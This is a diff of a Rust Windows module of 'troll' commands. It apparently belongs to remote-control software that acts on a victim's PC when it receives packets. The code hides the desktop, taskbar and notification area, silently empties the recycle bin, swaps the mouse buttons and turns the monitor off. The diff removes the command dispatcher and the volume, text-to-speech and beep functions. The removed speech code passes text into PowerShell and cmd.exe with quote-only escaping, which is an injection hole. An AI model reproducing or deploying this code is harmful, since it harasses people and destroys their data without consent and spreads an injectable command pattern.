@@ -1,4 +1,3 @@
-use common::packets::TrollCommand;
 use std::ptr::null_mut;
 use winapi::um::winuser::{
     SW_HIDE, SW_SHOW, ShowWindow, FindWindowA, FindWindowExA,
@@ -6,9 +5,6 @@ use winapi::um::winuser::{
     GetForegroundWindow, keybd_event,
     PostMessageA, SystemParametersInfoA,
     VK_ESCAPE, KEYEVENTF_KEYUP, WM_SYSCOMMAND, SC_MONITORPOWER,
-    
-    // Add virtual key codes for volume control
-    VK_VOLUME_UP, VK_VOLUME_DOWN, VK_VOLUME_MUTE
 };
 use winapi::shared::minwindef::{TRUE, FALSE};
 use std::process::Command;
@@ -18,41 +14,8 @@ use std::iter::once;
 use std::thread;
 use winapi::um::shellapi::{SHEmptyRecycleBinW, SHERB_NOCONFIRMATION, SHERB_NOPROGRESSUI, SHERB_NOSOUND};
 
-use winapi::um::utilapiset::Beep;
 
-pub fn execute_troll_command(command: &TrollCommand) {
-        match command {
-            TrollCommand::HideDesktop(_p) => toggle_desktop(false),
-            TrollCommand::ShowDesktop(_p) => toggle_desktop(true),
-            TrollCommand::HideTaskbar(_p) => toggle_taskbar(false),
-            TrollCommand::ShowTaskbar(_p) => toggle_taskbar(true),
-            TrollCommand::HideNotify(_p) => toggle_notification_area(false),
-            TrollCommand::ShowNotify(_p) => toggle_notification_area(true),
-            TrollCommand::FocusDesktop(_p) => focus_desktop(),
-            TrollCommand::EmptyTrash(_p) => empty_recycle_bin(),
-            TrollCommand::RevertMouse(_p) => toggle_invert_mouse(true),
-            TrollCommand::NormalMouse(_p) => toggle_invert_mouse(false),
-            TrollCommand::MonitorOff(_p) => toggle_monitor(false),
-            TrollCommand::MonitorOn(_p) => toggle_monitor(true),
-            TrollCommand::MaxVolume(_p) => max_volume(),
-            TrollCommand::MinVolume(_p) => min_volume(),
-            TrollCommand::MuteVolume(_p) => mute_volume(),
-            TrollCommand::UnmuteVolume(_p) => unmute_volume(),
-            TrollCommand::SpeakText(text) => speak_text(text),
-            TrollCommand::Beep(freq_duration)=> {
-                let freq_duration = freq_duration.split(":").collect::<Vec<&str>>();
-                let freq = freq_duration[0].parse::<u32>().unwrap();
-                let duration = freq_duration[1].parse::<u32>().unwrap();
-                unsafe { Beep(freq, duration); }
-            },
-            TrollCommand::PianoKey(key) => {
-                let key = key.parse::<u32>().unwrap();
-                piano_key(key)
-            },
-        }
-}
-
-fn toggle_desktop(show: bool) {
+pub fn toggle_desktop(show: bool) {
     let visibility = if show { SW_SHOW } else { SW_HIDE };
     
     if !try_toggle_desktop_icons(visibility) && !try_toggle_desktop_window(visibility) {
@@ -60,7 +23,7 @@ fn toggle_desktop(show: bool) {
     }
 }
 
-fn try_toggle_desktop_icons(visibility: i32) -> bool {
+pub fn try_toggle_desktop_icons(visibility: i32) -> bool {
     unsafe {
         let prog_man = GetShellWindow();
         if prog_man.is_null() {
@@ -138,7 +101,7 @@ fn try_toggle_desktop_icons(visibility: i32) -> bool {
     false
 }
 
-fn try_toggle_desktop_window(visibility: i32) -> bool {
+pub fn try_toggle_desktop_window(visibility: i32) -> bool {
     unsafe {
         let mut worker_w = FindWindowExA(
             null_mut(),
@@ -188,7 +151,7 @@ fn try_toggle_desktop_window(visibility: i32) -> bool {
     false
 }
 
-fn toggle_taskbar(show: bool) {
+pub fn toggle_taskbar(show: bool) {
     unsafe {
         let taskbar = FindWindowA(b"Shell_TrayWnd\0".as_ptr() as *const i8, null_mut());
         
@@ -199,7 +162,7 @@ fn toggle_taskbar(show: bool) {
     }
 }
 
-fn toggle_notification_area(show: bool) {
+pub fn toggle_notification_area(show: bool) {
     unsafe {
         let taskbar = FindWindowA(b"Shell_TrayWnd\0".as_ptr() as *const i8, null_mut());
         
@@ -213,7 +176,7 @@ fn toggle_notification_area(show: bool) {
             
             if !tray_notify_wnd.is_null() {
                 let visibility = if show { SW_SHOW } else { SW_HIDE };
-                let action_str = if show { "showing" } else { "hiding" };
+                let _action_str = if show { "showing" } else { "hiding" };
                 
                 ShowWindow(tray_notify_wnd, visibility);
                 return;
@@ -222,7 +185,7 @@ fn toggle_notification_area(show: bool) {
     }
 }
 
-fn focus_desktop() {
+pub fn focus_desktop() {
     unsafe {
         const VK_LWIN: u8 = 0x5B;
         const VK_D: u8 = 0x44;
@@ -243,7 +206,7 @@ fn focus_desktop() {
     }
 }
 
-fn empty_recycle_bin() {
+pub fn empty_recycle_bin() {
     unsafe {
         let null_string: Vec<u16> = OsStr::new("")
             .encode_wide()
@@ -258,7 +221,7 @@ fn empty_recycle_bin() {
     }
 }
 
-fn toggle_invert_mouse(invert: bool) {
+pub fn toggle_invert_mouse(invert: bool) {
     unsafe {
         const SPI_SETMOUSEBUTTONSWAP: u32 = 0x0021;
         
@@ -280,7 +243,7 @@ fn toggle_invert_mouse(invert: bool) {
     }
 }
 
-fn toggle_monitor(on: bool) {
+pub fn toggle_monitor(on: bool) {
     unsafe {
         let power_state = if on { -1 } else { 2 };
         
@@ -327,115 +290,6 @@ fn toggle_monitor(on: bool) {
             let _output = Command::new("powershell.exe")
                 .args(["-NoProfile", "-Command", ps_script])
                 .output();
-        }
-    }
-}
-
-fn mute_volume() {
-    unsafe {
-        keybd_event(VK_VOLUME_MUTE as u8, 0, 0, 0);
-        keybd_event(VK_VOLUME_MUTE as u8, 0, KEYEVENTF_KEYUP, 0);
-        thread::sleep(std::time::Duration::from_millis(100));
-    }
-}
-
-fn unmute_volume() {
-    unsafe {
-        keybd_event(VK_VOLUME_MUTE as u8, 0, 0, 0);
-        keybd_event(VK_VOLUME_MUTE as u8, 0, KEYEVENTF_KEYUP, 0);
-        thread::sleep(std::time::Duration::from_millis(100));
-    }
-}
-
-fn max_volume() {
-    unmute_volume();
-    thread::sleep(std::time::Duration::from_millis(100));
-    
-    unsafe {
-        for _ in 0..50 {
-            keybd_event(VK_VOLUME_UP as u8, 0, 0, 0);
-            keybd_event(VK_VOLUME_UP as u8, 0, KEYEVENTF_KEYUP, 0);
-            thread::sleep(std::time::Duration::from_millis(20));
-        }
-    }
-}
-
-fn min_volume() {
-    unmute_volume();
-    thread::sleep(std::time::Duration::from_millis(100));
-    
-    unsafe {
-        for _ in 0..50 {
-            keybd_event(VK_VOLUME_DOWN as u8, 0, 0, 0);
-            keybd_event(VK_VOLUME_DOWN as u8, 0, KEYEVENTF_KEYUP, 0);
-            thread::sleep(std::time::Duration::from_millis(20));
-        }
-    }
-}
-
-fn speak_text(text: &str) {    
-    let ps_text = text.replace("\"", "\\\""); // Escape quotes for PowerShell
-    let ps_script = format!(
-        "Add-Type -AssemblyName System.Speech; \
-         $speak = New-Object System.Speech.Synthesis.SpeechSynthesizer; \
-         $speak.Speak(\"{}\")", 
-        ps_text
-    );
-    
-    match Command::new("powershell.exe")
-        .args(["-Command", &ps_script])
-        .spawn() {
-        Ok(_) => {},
-        Err(e) => {
-            speak_text_with_sapi(text);
-        }
-    }
-}
-
-fn speak_text_with_sapi(text: &str) {
-    let vbs_text = text.replace("\"", "\"\""); // Escape quotes for VBScript
-    let vbs_script = format!(
-        "CreateObject(\"SAPI.SpVoice\").Speak \"{}\"", 
-        vbs_text
-    );
-    
-    match Command::new("cmd.exe")
-        .args(["/c", "echo", &vbs_script, ">", "temp_speech.vbs", "&&", "cscript", "//nologo", "temp_speech.vbs", "&&", "del", "temp_speech.vbs"])
-        .spawn() {
-        Ok(_) => {},
-        Err(_e) => {},
-    }
-}
-
-fn key_to_midi(key: u32) -> Option<u32> {
-    match key {
-        1 => Some(71), // B4
-        2 => Some(70), // A#4
-        3 => Some(69), // A4 (440Hz)
-        4 => Some(68), // G#4
-        5 => Some(67), // G4
-        6 => Some(66), // F#4
-        7 => Some(65), // F4
-        8 => Some(64), // E4
-        9 => Some(63), // D#4
-        10 => Some(62), // D4
-        11 => Some(61), // C#4
-        12 => Some(60), // C4 (Middle C)
-        _ => None,
-    }
-}
-
-fn midi_to_freq(midi: u32) -> u32 {
-    let freq = 440.0 * 2f64.powf((midi as f64 - 69.0) / 12.0);
-    freq.round() as u32
-}
-
-
-pub fn piano_key(key: u32) {
-    if let Some(midi) = key_to_midi(key) {
-        let freq = midi_to_freq(midi);
-        unsafe {
-            Beep(freq, 300);
         }
     }
 }
